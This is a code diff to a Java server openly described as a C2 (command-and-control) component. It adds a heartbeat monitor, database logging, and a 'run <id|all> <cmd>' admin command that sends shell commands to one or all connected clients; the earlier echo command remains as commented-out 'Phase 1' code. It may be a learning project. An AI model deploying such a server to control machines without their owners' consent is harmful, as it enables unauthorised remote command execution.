@@ -8,10 +8,29 @@ import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
 import java.util.concurrent.atomic.AtomicInteger;
 
+/**
+ * Main C2 server component.
+ *
+ * The server is responsible for:
+ * - Initializing the DatabaseManage component for logging and persistence
+ * - Accepting incoming client connections on port 8080 using a fixed Thread Pool (ExecutorService)
+ * - Assigning each client a unique ID using an atomic counter for thread safety
+ * - Managing active connections within a ConcurrentHashMap
+ * - Spawning a dedicated ClientHandler for each connection to process tasks asynchronously
+ * - Providing a CLI interface (runAdminCLI) for administrative control 
+ *   (status, kill <id|all>, run <id|all> <cmd>, exit)
+ * - Running a background heartbeat-monitoring daemon thread that detects 
+ *   and disconnects inactive clients based on last activity timestamps
+ * - Logging all major events and administrative commands to the database
+ *
+ * The server handles administrative commands and client communication 
+ * concurrently, ensuring the main connection loop remains non-blocking.
+ */
+
 public class Server {
 
     private static final int PORT = 8080;
-    private static final int MAX_THREADS = 40;
+    private static final int MAX_THREADS = 200;
     private static final ExecutorService pool = Executors.newFixedThreadPool(MAX_THREADS);
     // Store active connections
     public static final ConcurrentHashMap<Integer, ClientHandler> clients = new ConcurrentHashMap<>();
@@ -21,7 +40,7 @@ public class Server {
     private static Thread adminThread;
 
     public static void main(String[] args) {
-        
+        DatabaseManage.initialize();
         System.out.println("Starting Server...");
         try {
             serverSocket = new ServerSocket(PORT);
@@ -30,6 +49,27 @@ public class Server {
             // Admin thread handles CLI commands
             adminThread = new Thread(Server::runAdminCLI);
             adminThread.start();
+
+            // Heartbeat Monitor Thread
+            Thread heartbeatMonitor = new Thread(() -> {
+                while (running) {
+                    try {
+                        Thread.sleep(30000); // Check every 30 seconds
+                        long now = System.currentTimeMillis();
+                        for (ClientHandler handler : clients.values()) {
+                            if ((now - handler.getLastHeartbeat()) > 60000) {
+                                System.out.println("\n[WARNING] Client " + handler.getClientId() + " timed out.");
+                                DatabaseManage.logEvent("Client " + handler.getClientId() + " timed out due to missing heartbeats.");
+                                handler.disconnect();
+                            }
+                        }
+                    } catch (InterruptedException e) {
+                        break;
+                    }
+                }
+            });
+            heartbeatMonitor.setDaemon(true);
+            heartbeatMonitor.start();
             
             // Accept connections loop
             while (running) {
@@ -40,6 +80,9 @@ public class Server {
                     clients.put(clientId, handler);
                     pool.execute(handler);
                     System.out.println("\n[INFO] Client " + clientId + " connected.");
+                    
+                    //DB
+                    DatabaseManage.logEvent("Client " + clientId + " connected from " + clientSocket.getInetAddress());
                     System.out.print("C2> ");
                 } catch (IOException e) {
                     if (running) {
@@ -68,7 +111,8 @@ public class Server {
                     if (input != null) {
                         input = input.trim();
                         if (!input.isEmpty()) {
-                            processCommand(input);
+                            final String finalInput = input;
+                            pool.execute(() -> processCommand(finalInput));
                         }
                     }
                     if (running) {
@@ -90,6 +134,7 @@ public class Server {
             switch (command) {
                 case "status":
                     System.out.println("[STATUS] Active Clients: " + clients.size());
+                    DatabaseManage.logCommand(DatabaseManage.SERVER_ID,"status",""+clients.size());
                     break;
                     
                 case "kill":
@@ -98,6 +143,7 @@ public class Server {
                     } else if (parts[1].equalsIgnoreCase("all")) {
                         int killed = 0;
                         for (ClientHandler handler : clients.values()) {
+                            DatabaseManage.logCommand(handler.getClientId(), "KILL", "Force disconnect all");
                             handler.disconnect();
                             killed++;
                         }
@@ -107,35 +153,41 @@ public class Server {
                             int id = Integer.parseInt(parts[1]);
                             ClientHandler handler = clients.get(id);
                             if (handler != null) {
+                                DatabaseManage.logCommand(id, "KILL", "Force disconnect");
                                 handler.disconnect();
                                 System.out.println("[INFO] Killed client " + id);
-                            } else {
+                            } 
+                            else {
                                 System.out.println("[ERROR] Client " + id + " not found.");
                             }
-                        } catch (NumberFormatException e) {
+                        } 
+                        catch (NumberFormatException e) {
                             System.out.println("[ERROR] Invalid Client ID format.");
                         }
                     }
                     break;
                     
-                case "echo":
+                case "run":
                     if (parts.length < 3) {
-                        System.out.println("[ERROR] Usage: echo <clientId|all> <message>");
-                    } else {
+                        System.out.println("[ERROR] Usage: run <clientId|all> <command>");
+                    } 
+                    else {
                         String target = parts[1];
-                        String msg = parts[2];
+                        String shellCommand = parts[2]; 
                         if (target.equalsIgnoreCase("all")) {
                             for (ClientHandler handler : clients.values()) {
-                                handler.sendMessage("ECHO " + msg);
+                                handler.sendMessage("RUN " + shellCommand);
+                                DatabaseManage.logCommand(handler.getClientId(), "RUN", shellCommand);
                             }
-                            System.out.println("[INFO] Sent echo to all active clients.");
+                            System.out.println("[INFO] Sent command to all active clients.");
                         } else {
                             try {
                                 int id = Integer.parseInt(target);
                                 ClientHandler handler = clients.get(id);
                                 if (handler != null) {
-                                    handler.sendMessage("ECHO " + msg);
-                                    System.out.println("[INFO] Sent echo to client " + id);
+                                    handler.sendMessage("RUN " + shellCommand);
+                                    DatabaseManage.logCommand(id, "RUN", shellCommand);
+                                    System.out.println("[INFO] Sent command to client " + id);
                                 } else {
                                     System.out.println("[ERROR] Client " + id + " not found.");
                                 }
@@ -144,16 +196,45 @@ public class Server {
                             }
                         }
                     }
+                //Phase 1:echo
+                    // if (parts.length < 3) {
+                    //     System.out.println("[ERROR] Usage: echo <clientId|all> <message>");
+                    // } else {
+                    //     String target = parts[1];
+                    //     String msg = parts[2];
+                    //     if (target.equalsIgnoreCase("all")) {
+                    //         for (ClientHandler handler : clients.values()) {
+                    //             handler.sendMessage("ECHO " + msg);
+                    //             DatabaseManage.logCommand(handler.getClientId(), "ECHO", msg);
+                    //         }
+                    //         System.out.println("[INFO] Sent echo to all active clients.");
+                    //     } else {
+                    //         try {
+                    //             int id = Integer.parseInt(target);
+                    //             ClientHandler handler = clients.get(id);
+                    //             if (handler != null) {
+                    //                 handler.sendMessage("ECHO " + msg);
+                    //                 DatabaseManage.logCommand(id, "ECHO", msg);
+                    //                 System.out.println("[INFO] Sent echo to client " + id);
+                    //             } else {
+                    //                 System.out.println("[ERROR] Client " + id + " not found.");
+                    //             }
+                    //         } catch (NumberFormatException e) {
+                    //             System.out.println("[ERROR] Invalid Client ID format.");
+                    //         }
+                    //     }
+                    // }
                     break;
                     
                 case "exit":
                 System.out.println("Initiating shutdown...");
+                    DatabaseManage.logCommand(DatabaseManage.SERVER_ID, "exit", "Shutdown server");
                     running = false;
                     shutdown();
                 break;
                     
                 default:
-                    System.out.println("[ERROR] Unknown command. Available: status | kill <id|all> | echo <id|all> <msg> | exit");
+                    System.out.println("[ERROR] Unknown command. Available: status | kill <id|all> | run <id|all> <cmd> | exit");
             }
     }
     
@@ -175,6 +256,7 @@ public class Server {
         catch (IOException e) {
             System.err.println("Error during shutdown: " + e.getMessage());
         }
+        DatabaseManage.close();
         System.out.println("Server shutdown complete.");
         System.exit(0);
     }
